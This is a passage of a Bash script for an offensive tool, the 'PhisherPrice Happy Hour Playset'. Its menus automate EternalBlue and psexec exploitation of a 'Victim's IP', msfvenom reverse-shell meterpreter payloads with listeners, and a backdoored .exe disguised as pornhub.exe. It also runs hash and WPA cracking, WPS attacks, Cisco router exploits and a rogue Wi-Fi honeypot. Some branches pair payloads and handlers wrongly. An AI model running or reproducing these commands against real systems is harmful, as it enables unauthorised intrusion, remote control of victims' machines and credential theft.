!!!!Gathering Information About Host!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

john --wordlist=$jwords --rules $jfiles

read

elif [ "$x" == "$subh" ]; then                    #Sub-Option-h
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!     CTRL + C TO QUIT         !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'
hash-identifier

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!           Good Bye               !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

read

elif [ "$x" == "$subi" ]; then                    #Sub-Option-i
clear
echo -e '\e[1;33m
  ___ ___               .__                   __   
 /   |   \_____    _____|  |__   ____ _____ _/  |_ 
/    ~    \__  \  /  ___/  |  \_/ ___\\__  \\   __\
\    Y    // __ \_\___ \|   Y  \  \___ / __ \|  |  
 \___|_  /(____  /____  >___|  /\___  >____  /__|  
       \/      \/     \/     \/     \/     \/      \e[1;34m
'
echo "Enter Hash Type: 500 = md5crypt"
read encmode
echo "Enter Hash Hocation eg: /usr/share/me/example500.hash"
read hashtype
echo "Enter Wordlist Location eg: /usr/share/wordlists/sqlmap.txt"
read hashpass1
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!  Attempting to Crack Hash Type   !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

hashcat -m $encmode $hashtype $hashpass1

read

elif [ "$x" == "$subj" ]; then                    #Sub-Option-j
clear
echo -e '\e[1;33m
   _____  .__                                    __                             
  /  _  \ |__|______   ________________    ____ |  | __           ____    ____  
 /  /_\  \|  \_  __ \_/ ___\_  __ \__  \ _/ ___\|  |/ /  ______  /    \  / ___\ 
/    |    \  ||  | \/\  \___|  | \// __ \\  \___|    <  /_____/ |   |  \/ /_/  >
\____|__  /__||__|    \___  >__|  (____  /\___  >__|_ \         |___|  /\___  / 
        \/                \/           \/     \/     \/              \//_____/  \e[1;34m
'
echo "Enter Password List Location"
read wifirip
echo "Enter filename.cap location"
read subopi
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!   Attempting to Crack WPA    !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

aircrack-ng -w $wifirip $subopi

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!         DID WE DO IT ?            !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

read

elif [ "$x" == "$subk" ]; then                    #Sub-Option-k
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!         Launching SQLdict         !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

sqldict

read

else 

n


fi

elif [ "$x" == "$option3" ]; then                          #Option3
clear
service postgresql start
echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    PhisherPrice
   /<<< \_\_  Happy Hour Playset
  /,)^>>_._ \ Version 2.5 
  (/   \\ /\\\
       // //```
======((`((====\e[1;34m
'
 echo -e '\e[3;34m Created by "Sir Cryptic"                 
                   https://nullsec.online
\e[0m\e[3;39m \e[1;31m
Auto Xsploit
\e[3;39m
(a1) Test Target If They are Vulnerable To (ms17_010)
(a2) Windows 7/2008 x64 ONLY by IP         (ms17_010_eternalblue)
(a3) Enable Remote Desktop                 (ms17_010_eternalblue)
(a4) Enable Remote Desktop                 (ms17_010_psexec)
(a5) Windows Vista/XP/2000/2003 ONLY by IP (ms17_010_psexec)
(a6) Windows with a link                   (HTA Server)
(a7) Windows     --> pwnd.exe (Payload & listener)
(a8) Windows     --> pwnd.exe (TCP Payload with shikata_ga_nai encoder)
(a9) Windows     --> pwnd.asp (Payload & listener)
(a10) Linux      --> pwnd.py  (Payload & listener)
(a11) MacOS      --> pwnd.jar (Payload & listener)
(a12) MacOS TCP  --> pwnd.macho (Payload & listener)
(a13) Javascript --> pwnd.jsp (Payload & listener)
(a14) Web        --> pwnd.php (Payload & listener)
(a15) MacOS      --> bind.macho (Bind Shell)
(a16) Backdoor .exe
(a17) Bind .exe With Payload & Encode (using shikata_ga_nai)
(a18) Android    --> pwnd.apk (payload & listener) 


CTRL + C To Exit
Press ENTER To Go To Main Menu
'
auto1='a1'
auto2='a2'
auto3='a3'
auto4='a4'
auto5='a5'
auto6='a6'
auto7='a7'
auto8='a8'
auto9='a9'
auto10='a10'
auto11='a11'
auto12='a12'
auto13='a13'
auto14='a14'
auto15='a15'
auto16='a16'
auto17='a17'
auto18='a18'

wait
echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Auto Xsploit$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$auto1" ]; then                    #auto-Option-1
clear
echo "Victim's IP:"
read r

msfconsole -q -x " use auxiliary/scanner/smb/smb_ms17_010; set rhosts $r ; exploit ;exit ;"
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read


elif [ "$x" == "$auto2" ]; then                    #auto-Option-2
echo "Victim's IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/meterpreter/reverse_tcp;  set lhost $ip ; set rhost $r ; exploit ; "




elif [ "$x" == "$auto3" ]; then                    #auto-Option-3
echo "Victim's IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_eternalblue; set payload windows/x64/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "

elif [ "$x" == "$auto4" ]; then                    #auto-Option-4
echo "Victim's IP:"
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set payload windows/vncinject/reverse_tcp;  set lhost $ip ; set rhost $r ; set viewonly false ; exploit ; "

elif [ "$x" == "$auto5" ]; then                    #auto-Option-5
echo "Victim's IP:" 
read r

msfconsole -q -x " use exploit/windows/smb/ms17_010_psexec; set lhost $ip ; set rhost $r ; exploit ;"


elif [ "$x" == "$auto6" ]; then                    #auto-Option-6
echo 'Uripath: (/)'
read u
msfconsole -q -x " use exploit/windows/misc/hta_server; set srvhost $ip; set uripath /$u; set payload windows/meterpreter/reverse_tcp; set lhost $ip ; exploit ;"

elif [ "$x" == "$auto7" ]; then                    #auto-Option-7
msfvenom -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 -f exe > /root/Desktop/pwnd.exe
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pwnd.exe!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto8" ]; then                    #auto-Option-8

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f exe > /root/Desktop/pwnd.exe
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pwnd.exe!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto9" ]; then                    #auto-Option-9

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -f asp > /root/Desktop/pwnd.asp
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pwnd.asp!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto10" ]; then                    #auto-Option-10

msfvenom -p python/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.py
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pwnd.py!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload python/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto11" ]; then                    #auto-Option-11
msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f jar > /root/Desktop/pwnd.jar
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pwnd.jar!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto12" ]; then                    #auto-Option-12
msfvenom -p osx/x86/shell_bind_tcp RHOST=$ip LPORT=4444 -f macho > bind.macho
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/bind.macho!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto13" ]; then                    #auto-Option-13
msfvenom -p java/meterpreter/reverse_tcp lhost=$ip lport=4444 -f raw > /root/Desktop/pwnd.jsp
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pwnd.jsp!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload java/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto14" ]; then                    #auto-Option-14
msfvenom -p php/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.php
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pwnd.php!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload php/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto15" ]; then                    #auto-Option-15

msfvenom -p osx/x86/shell_bind_tcp RHOST=$ip LPORT=4444 -f macho > bind.macho
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/bind.macho!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto16" ]; then                    #auto-Option-16
echo "your .exe location:"
read exelocation
msfvenom -x $exelocation -k -p windows/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pornhub.exe
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pornhub.exe!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto17" ]; then                    #auto-Option-17
echo "your .exe location:"
read bindexelocation
msfvenom -x $bindexelocation -k -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 -e x86/shikata_ga_nai -i 3 -b “\x00” -f exe > example.exe
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pornhub.exe!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"

elif [ "$x" == "$auto18" ]; then                    #auto-Option-18
msfvenom -p osx/x86/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.apk
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!Your payload: /root/Desktop/pwnd.apk!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
Waiting for listener...
 
'

msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"


else 

n


fi

elif [ "$x" == "$option4" ]; then                          #Option4
clear
echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    PhisherPrice
   /<<< \_\_  Happy Hour Playset
  /,)^>>_._ \ Version 2.5 
  (/   \\ /\\\
       // //```
======((`((====\e[1;34m
'
 echo -e '\e[3;34m Created by "Sir Cryptic"                 
                   https://nullsec.online
\e[0m\e[3;39m \e[1;31m
WI-FI xSploits
\e[3;39m
(w1) Stealth ARP Scan
(w2) Passive ARP Scan
(w3) Cisco Routers
(w4) MasScan (Find Open Ports/Ips)
(w5) Start Wifite
(w6) Start Yersinia
(w7) Bully
(w8) Start Fern (Wifi Cracker)
(w9) Start Eassid-ng (Buddy-ng)
(w10) Start Kismet
(w11) Wi-Fi HoneyPot

CTRL + C To Exit
Press ENTER To Go To Main Menu
'
suba='w1'
subb='w2'
subc='w3'
subd='w4'
sube='w5'
yersin='w6'
bully='w7'
blueranger='w8'
eeng='w9'
kissmet1='w10'
whoney='w11'

wait
echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"Networking$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$suba" ]; then                    #Sub-Option-a
clear
echo -e '\e[1;33m
  _________ __                .__   __  .__         _____                
 /   _____//  |_  ____ _____  |  |_/  |_|  |__     /  _  \_____________  
 \_____  \\   __\/ __ \\__  \ |  |\   __\  |  \   /  /_\  \_  __ \____ \ 
 /        \|  | \  ___/ / __ \|  |_|  | |   Y  \ /    |    \  | \/  |_> >
/_______  /|__|  \___  >____  /____/__| |___|  / \____|__  /__|  |   __/ 
        \/           \/     \/               \/          \/      |__|    \e[1;34m
'
echo "Example IP Usage: 192.168.9.99 "
echo "Enter Ip:"
read subopa
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
! Scanning The Network Like A NINJA :D !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

arp-scan -l -s $subopa -v

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!    We Escaped Undetected :D      !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

read

elif [ "$x" == "$subb" ]; then                    #Sub-Option-b
clear
echo -e '\e[1;33m
   _____ ____________________    _________      .__  _____  _____             
  /  _  \\______   \______   \  /   _____/ ____ |__|/ ____\/ ____\___________ 
 /  /_\  \|       _/|     ___/  \_____  \ /    \|  \   __\\   __\/ __ \_  __ \
/    |    \    |   \|    |      /        \   |  \  ||  |   |  | \  ___/|  | \/
\____|__  /____|_  /|____|     /_______  /___|  /__||__|   |__|  \___  >__|   
        \/       \/                    \/     \/                     \/       \e[1;34m
'
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!Gathering Information About Host!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'
clear

netdiscover -p

read

elif [ "$x" == "$subc" ]; then                    #Sub-Option-c
clear
echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    PhisherPrice
   /<<< \_\_  Happy Hour Playset
  /,)^>>_._ \ Version 2.5 
  (/   \\ /\\\
       // //```
======((`((====\e[1;34m
'
 echo -e '\e[3;34m Created by "Sir Cryptic"                 
                   https://nullsec.online
\e[0m\e[3;39m \e[1;31m
Cisco Wifi Routers
\e[3;39m
(r1) Cisco GE xPloit
(r2) Cisco Audit Tool

CTRL + C To Exit
Press ENTER To Go To Main Menu
'
cisco1='r1'
cisco2='r2'


wait
echo -e $BlueF" ┌─["$red"PhisherPrice$BlueF]──[$red~$BlueF]─["$yellow"Cisco Routers$BlueF]:"
echo -e $BlueF" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$cisco1" ]; then                    #cisco-Option-1
clear
echo -e '\e[1;33m
_________   ________  ___________              .__         .__  __   
\_   ___ \ /  _____/  \_   _____/__  _________ |  |   ____ |__|/  |_ 
/    \  \//   \  ___   |    __)_\  \/  /\____ \|  |  /  _ \|  \   __\
\     \___\    \_\  \  |        \>    < |  |_> >  |_(  <_> )  ||  |  
 \______  /\______  / /_______  /__/\_ \|   __/|____/\____/|__||__|  
        \/        \/          \/      \/|__|                         \e[1;34m
'  
echo "Enter Targets IP For EG: "
read ciscooip2
echo -e '
[1] - Cisco 677/678 Telnet Buffer Overflow Vulnerability
[2] - Cisco IOS Router Denial of Service Vulnerability
[3] - Cisco IOS HTTP Auth Vulnerability
[4] - Cisco IOS HTTP Configuration Arbitrary Administrative Access Vulnerability
[5] - Cisco Catalyst SSH Protocol Mismatch Denial of Service Vulnerability
[6] - Cisco 675 Web Administration Denial of Service Vulnerability
[7] - Cisco Catalyst 3500 XL Remote Arbitrary Command Vulnerability
[8] - Cisco IOS Software HTTP Request Denial of Service Vulnerability
[9] - Cisco 514 UDP Flood Denial of Service Vulnerability
[10] - CiscoSecure ACS for Windows NT Server Denial of Service Vulnerability
[11] - Cisco Catalyst Memory Leak Vulnerability
[12] - Cisco CatOS CiscoView HTTP Server Buffer Overflow Vulnerability
[13] - 0 Encoding IDS Bypass Vulnerability (UTF)
[14] - Cisco IOS HTTP Denial of Service Vulnerability
'
echo "Please Slect An Option For eg: 1 or 6"

read C
echo "Dou You Have A Password List?"
echo "If So Type: -a Then The Location Of Your List Otherwise PRESS ENTER"
read passlist
echo "Dou You Have A User's List For Name Guessing?"
echo "If So Type: -w Then The Location Of Your List Otherwise PRESS ENTER"
read userlist
echo "Dou You Want To Check For IOS History Bug?"
echo "If So Type: -i Otherwise PRESS ENTER"
read ioscheck
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!     Trying To PWN Router :D      !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'
cge.pl $ciscooip2 $C $ioscheck $passlist $userlist

read

elif [ "$x" == "$cisco2" ]; then                    #cisco-Option-2
clear
echo -e '\e[1;33m
_________     ________________
\_   ___ \   /  _  \__    ___/
/    \  \/  /  /_\  \|    |   
\     \____/    |    \    |   
 \______  /\____|__  /____|   
        \/         \/         \e[1;34m
'  
echo Cisco Auditing Tool

echo "Enter The IP eg: 192.168.1.202"
read cauditip
echo "Type The Port You Want To Test ( 23 ) is Default"
read cauditport
echo "Dou You Have A Password List?"
echo "If So Type: -a space Then The Location Of Your List Otherwise PRESS ENTER"
echo "For Default"
read cauditpasslist
echo "Dou You Have A User's List For Name Guessing?"
echo "If So Type: -w space Then The Location Of Your List Otherwise PRESS ENTER"
read userlist2
echo "Dou You Want To Check For IOS History Bug?"
echo "If So Type: -i Otherwise PRESS ENTER"
read ioscheck2
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!       Auditing The Host        !!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'


CAT -h $cauditip -p $cauditport $cauditpasslist $ioscheck2 $userlist2

read

else 

n


fi

elif [ "$x" == "$subd" ]; then                    #Sub-Option-d
clear
echo -e '\e[1;33m
   _____                  _________                     
  /     \ _____    ______/   _____/ ____ _____    ____  
 /  \ /  \\__  \  /  ___/\_____  \_/ ___\\__  \  /    \ 
/    Y    \/ __ \_\___ \ /        \  \___ / __ \|   |  \
\____|__  (____  /____  >_______  /\___  >____  /___|  /
        \/     \/     \/        \/     \/     \/     \/ \e[1;34m
'  
echo -e '
Scan For Open Ports On Networks
'

echo "Enter IP For eg: 192.168.1.0"
read massip
echo "Enter The Range For eg: 24 or 80"
read massrange
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!   Press Ctrl + C To Stop     !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

 masscan -p22,21,80,445,443 $massip/$massrange

read

elif [ "$x" == "$sube" ]; then                    #Sub-Option-e
clear
echo -e '\e[1;33m
 __      __.__  _____.__  __          
/  \    /  \__|/ ____\__|/  |_  ____  
\   \/\/   /  \   __\|  \   __\/ __ \ 
 \        /|  ||  |  |  ||  | \  ___/ 
  \__/\  / |__||__|  |__||__|  \___  >
       \/                          \/ \e[1;34m
'  
echo "Are You Sure You Want To Start WIFITE ?"
echo "Press ENTER For YES Any Other Option To Return"
read wifiwanger
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!    Starting Wifite         !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

$wifiwanger wifite --kill-all

read

elif [ "$x" == "$yersin" ]; then                    #Sub-Option-e
clear
echo -e '\e[1;33m
_____.___.                   .__       .__        
\__  |   | ___________  _____|__| ____ |__|____   
 /   |   |/ __ \_  __ \/  ___/  |/    \|  \__  \  
 \____   \  ___/|  | \/\___ \|  |   |  \  |/ __ \_
 / ______|\___  >__|  /____  >__|___|  /__(____  /
 \/           \/           \/        \/        \/ \e[1;34m
'
echo "Are You Sure You Want To Start Yersinia ?"
echo "Press ENTER For YES Any Other Option To Return"
read siryessir
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!    Starting Yersinia       !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

$siryessir yersinia -G

read

elif [ "$x" == "$bully" ]; then                    #YouLilBully
clear
echo -e '\e[1;33m
__________      .__  .__          __________       .__ 
\______   \__ __|  | |  | ___.__. \______   \ ____ |__|
 |    |  _/  |  \  | |  |<   |  |  |    |  _//  _ \|  |
 |    |   \  |  /  |_|  |_\___  |  |    |   (  <_> )  |
 |______  /____/|____/____/ ____|  |______  /\____/|__|
        \/                \/              \/           \e[1;34m
'  
echo "Are You Sure You Want To Bully someones network ?"
echo " I NEED THE ESSID FIRST IT LOOKS LIKE THIS : 6F36E6"
read bullyboy
echo "Witch Device Are You Using? wlan0mon Or wlan1mon ?"
read boibully
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!     YOU BIG BULLY          !!!!!
!!!!!!!     POOR NETWORK :(        !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

bully -e $bullyboi $boibully

read

elif [ "$x" == "$blueranger" ]; then                          #BlueRanger
echo "Are You Sure You Want To Start Fern ?"
echo "Press ENTER For YES Any Other Key To Go Back"
read Bluerange
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!  Starting Fern Wifi-Cracker  !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

$Bluerange fern-wifi-cracker

read

elif [ "$x" == "$eeng" ]; then                          #BlueRanger
clear
echo -e '\e[1;33m
___________                    .__    .___                               
\_   _____/____    ______ _____|__| __| _/____             ____    ____  
 |    __)_\__  \  /  ___//  ___/  |/ __ |/ __ \   ______  /    \  / ___\ 
 |        \/ __ \_\___ \ \___ \|  / /_/ \  ___/  /_____/ |   |  \/ /_/  >
/_______  (____  /____  >____  >__\____ |\___  >         |___|  /\___  / 
        \/     \/     \/     \/        \/    \/               \//_____/  \e[1;34m
'
echo "Are You Sure You Want To Start Easside ?"
read buddytheelf
echo "Enter Victims BSSID Looks Like This : de:ad:be:ef:ca:fe"
read vbssid
echo "Enter Source MAC address"
read srcmac
echo "Enter Buddy-ng IP address (mandatory) Usually: 127.0.0.1"
read srcip
echo "Enter Your InterFace wlan0mon or wlan1mon"
read easymc
echo "Enter The Channel ID eg: 6 "
read easychan
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!   Starting  Fern Easside-NG  !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

$buddytheelf gnome-terminal -x sh -c "buddy-ng; bash"

easside-ng -v $vbssid -m $srcmac -s $srcip -f $easymc -c $easychan

read

elif [ "$x" == "$kissmet1" ]; then                          #routersploit
clear
echo -e '\e[1;33m
 ____  __.__          _____          __   
|    |/ _|__| ______ /     \   _____/  |_ 
|      < |  |/  ___//  \ /  \_/ __ \   __\
|    |  \|  |\___ \/    Y    \  ___/|  |  
|____|__ \__/____  >____|__  /\___  >__|  
        \/       \/        \/     \/      \e[1;34m
'  
echo "Are You Sure You Want To Start Kismet ?"
read kissmebaby
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!     Starting  Kismet         !!!!!
!!!!!  To Stop Kismet CTRL + C     !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'
$kissmebaby kismet

read

elif [ "$x" == "$whoney" ]; then                          #routersploit
clear
echo -e '\e[1;33m
 __      __.______________.___    ___ ___                     _____.___.__________       __   
/  \    /  \   \_   _____/|   |  /   |   \  ____   ____   ____\__  |   |\______   \_____/  |_ 
\   \/\/   /   ||    __)  |   | /    ~    \/  _ \ /    \_/ __ \/   |   | |     ___/  _ \   __\
 \        /|   ||     \   |   | \    Y    (  <_> )   |  \  ___/\____   | |    |  (  <_> )  |  
  \__/\  / |___|\___  /   |___|  \___|_  / \____/|___|  /\___  > ______| |____|   \____/|__|  
       \/           \/                 \/             \/     \/\/                             \e[1;34m
'  
echo "Are You Sure You Want To Start HoneyPot ?"
read hpot
echo "enter a wifi name of your choice"
read wifiname
echo "enter wifi channel you wish to broadcast on eg: 6 or 11"
read wifichannel
echo "Enter Your Interface: wlan0 or wlan1"
read hpotif
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!     Starting  HoneyPot       !!!!!
!!!!!  To Stop HoneyPot CTRL + C   !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'
$hpot airmon-ng check kill

wifi-honey $wifiname $wifichannel $hpotif

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!       To Disbale Monitor Mode        !
! sudo service network-manager restart !
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

read

else 

n


fi

elif [ "$x" == "$option5" ]; then                          #Option5
clear
echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    PhisherPrice
   /<<< \_\_  Happy Hour Playset
  /,)^>>_._ \ Version 2.5 
  (/   \\ /\\\
       // //```
======((`((====\e[1;34m
'
 echo -e '\e[3;34m Created by "Sir Cryptic"                 
                   https://nullsec.online
\e[0m\e[3;39m \e[1;31m
Create Your Own Xsploit
\e[3;39m
(x1) Windows
(x2) Linux
(x3) OSX
(x4) APK
(x5) ASP
(x6) ASPX
(x7) Bash
(x8) Java
(x9) Perl
(x10) PHP
(x11) Powershell
(x12) Python
(x13) Tomcat

CTRL + C To Exit
Press ENTER To Go To Main Menu
'
cyouro1='x1'
cyouro2='x2'
cyouro3='x3'
cyouro4='x4'
cyouro5='x5'
cyouro6='x6'
cyouro7='x7'
cyouro8='x8'
cyouro9='x9'
cyouro10='x10'
cyouro11='x11'
cyouro12='x12'
cyouro13='x13'

wait
echo -e $Blue" ┌─["$red"PhisherPrice$Blue]──[$red~$Blue]─["$yellow"CYO Xsploit$Blue]:"
echo -e $Blue" └─────► " ;read -p " CHOOSE: " x

if [ "$x" == "$cyouro1" ]; then                    #cyouro-Option-1
clear

msfpc windows bind 5555 verbose

read

elif [ "$x" == "$cyouro2" ]; then                    #cyouro-Option-2

clear
msfpc linux bind 5555 verbose

read

elif [ "$x" == "$cyouro3" ]; then                    #cyouro-Option-3
clear

msfpc osx bind 5555 verbose

read

elif [ "$x" == "$cyouro4" ]; then                    #cyouro-Option-4

clear

msfpc apk bind 5555 verbose

read

elif [ "$x" == "$cyouro5" ]; then                    #cyouro-Option-5
clear

msfpc asp bind 5555 verbose

read

elif [ "$x" == "$cyouro6" ]; then                    #cyouro-Option-6
clear

msfpc aspx bind 5555 verbose

read

elif [ "$x" == "$cyouro7" ]; then                    #cyouro-Option-7
clear

msfpc bash bind 5555 verbose

read

elif [ "$x" == "$cyouro8" ]; then                    #cyouro-Option-8
clear

